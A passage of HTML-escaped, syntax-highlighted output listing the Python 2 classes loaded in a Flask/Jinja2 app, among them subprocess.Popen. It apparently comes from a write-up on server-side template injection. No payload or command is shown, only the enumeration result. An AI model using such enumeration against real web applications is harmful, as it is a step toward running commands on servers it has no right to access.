class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">warnings</span>.<span class="hljs-title">WarningMessage</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">warnings</span>.<span class="hljs-title">catch_warnings</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_weakrefset</span>.<span class="hljs-title">_IterationGuard</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_weakrefset</span>.<span class="hljs-title">WeakSet</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Hashable</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">classmethod</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Iterable</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Sized</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Container</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">_abcoll</span>.<span class="hljs-title">Callable</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_keys</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_items</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">dict_values</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">_Printer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">_Helper</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Pattern</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Match</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_sre</span>.<span class="hljs-title">SRE_Scanner</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">site</span>.<span class="hljs-title">Quitter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalEncoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">codecs</span>.<span class="hljs-title">IncrementalDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">functools</span>.<span class="hljs-title">partial</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">itemgetter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">attrgetter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">operator</span>.<span class="hljs-title">methodcaller</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">collections</span>.<span class="hljs-title">deque</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">deque_iterator</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">deque_reverse_iterator</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">combinations</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">combinations_with_replacement</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">cycle</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">dropwhile</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">takewhile</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">islice</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">starmap</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">imap</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">chain</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">compress</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">ifilter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">ifilterfalse</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">count</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">izip</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">izip_longest</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">permutations</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">product</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">repeat</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">groupby</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">tee_dataobject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">tee</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">itertools</span>.<span class="hljs-title">_grouper</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_thread</span>.<span class="hljs-title">_localdummy</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">thread</span>.<span class="hljs-title">_local</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">thread</span>.<span class="hljs-title">lock</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">Struct</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_json</span>.<span class="hljs-title">Scanner</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_json</span>.<span class="hljs-title">Encoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">json</span>.<span class="hljs-title">decoder</span>.<span class="hljs-title">JSONDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">json</span>.<span class="hljs-title">encoder</span>.<span class="hljs-title">JSONEncoder</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">time</span>.<span class="hljs-title">struct_time</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">threading</span>.<span class="hljs-title">_Verbose</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cPickle</span>.<span class="hljs-title">Unpickler</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cPickle</span>.<span class="hljs-title">Pickler</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cStringIO</span>.<span class="hljs-title">StringO</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">cStringIO</span>.<span class="hljs-title">StringI</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">string</span>.<span class="hljs-title">Template</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">string</span>.<span class="hljs-title">Formatter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ssl</span>.<span class="hljs-title">_SSLContext</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ssl</span>.<span class="hljs-title">_SSLSocket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_closedsocket</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_socket</span>.<span class="hljs-title">socket</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">method_descriptor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_socketobject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">socket</span>.<span class="hljs-title">_fileobject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">urlparse</span>.<span class="hljs-title">ResultMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">contextlib</span>.<span class="hljs-title">GeneratorContextManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">contextlib</span>.<span class="hljs-title">closing</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">MissingType</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">LRUCache</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Cycler</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Joiner</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">Namespace</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">markupsafe</span>.<span class="hljs-title">_MarkupEscapeHelper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">nodes</span>.<span class="hljs-title">EvalContext</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_hashlib</span>.<span class="hljs-title">HASH</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">nodes</span>.<span class="hljs-title">Node</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_random</span>.<span class="hljs-title">Random</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">TemplateReference</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">Environment</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">BlockReference</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">LoopContextBase</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">LoopContextIterator</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Macro</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Undefined</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">numbers</span>.<span class="hljs-title">Number</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">Decimal</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_ContextManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_WorkRep</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_Log10Memoize</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ast</span>.<span class="hljs-title">AST</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">Failure</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">TokenStreamIterator</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">TokenStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">Lexer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Parser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">visitor</span>.<span class="hljs-title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">idtracking</span>.<span class="hljs-title">Symbols</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">compiler</span>.<span class="hljs-title">MacroRef</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">compiler</span>.<span class="hljs-title">Frame</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">Template</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateModule</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateExpression</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">loaders</span>.<span class="hljs-title">BaseLoader</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_io</span>.<span class="hljs-title">_IOBase</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_io</span>.<span class="hljs-title">IncrementalNewlineDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">bccache</span>.<span class="hljs-title">Bucket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">bccache</span>.<span class="hljs-title">BytecodeCache</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">LogRecord</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Formatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">BufferingFormatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Filter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Filterer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">PlaceHolder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Manager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">LoggerAdapter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">date</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">timedelta</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">time</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">tzinfo</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">_internal</span>.<span class="hljs-title">_Missing</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">_internal</span>.<span class="hljs-title">_DictAccessorProperty</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableListMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableDictMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">UpdateDictMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ViewItems</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">_omd_bucket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">Headers</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableHeadersMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">IfRange</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">Range</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ContentRange</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">FileStorage</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">email</span>.<span class="hljs-title">LazyImporter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">calendar</span>.<span class="hljs-title">Calendar</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">urls</span>.<span class="hljs-title">Href</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">HTMLBuilder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">accept</span>.<span class="hljs-title">AcceptMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">auth</span>.<span class="hljs-title">AuthorizationMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">auth</span>.<span class="hljs-title">WWWAuthenticateMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">ClosingIterator</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">FileWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">_RangeWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">dispatcher</span>.<span class="hljs-title">DispatcherMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">http_proxy</span>.<span class="hljs-title">ProxyMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">shared_data</span>.<span class="hljs-title">SharedDataMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">formparser</span>.<span class="hljs-title">FormDataParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">formparser</span>.<span class="hljs-title">MultiPartParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">base_request</span>.<span class="hljs-title">BaseRequest</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">base_response</span>.<span class="hljs-title">BaseResponse</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">common_descriptors</span>.<span class="hljs-title">CommonRequestDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">common_descriptors</span>.<span class="hljs-title">CommonResponseDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">etag</span>.<span class="hljs-title">ETagRequestMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">etag</span>.<span class="hljs-title">ETagResponseMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">user_agent</span>.<span class="hljs-title">UserAgentMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">request</span>.<span class="hljs-title">StreamOnlyMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">response</span>.<span class="hljs-title">ResponseStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">response</span>.<span class="hljs-title">ResponseStreamMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">exceptions</span>.<span class="hljs-title">Aborter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">uuid</span>.<span class="hljs-title">UUID</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">CArgObject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">CThunkObject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">_CData</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">CField</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">DictRemover</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">CDLL</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">LibraryLoader</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">select</span>.<span class="hljs-title">epoll</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">subprocess</span>.<span class="hljs-title">Popen</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">_json</span>.<span class="hljs-title">_CompactJSON</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">signer</span>.<span class="hljs-title">SigningAlgorithm</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">signer</span>.<span class="hljs-title">Signer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">serializer</span>.<span class="hljs-title">Serializer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">url_safe</span>.<span class="hljs-title">URLSafeSerializerMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_DeprecatedBool</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">Local</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalStack</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalProxy</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ast</span>.<span class="hljs-title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span 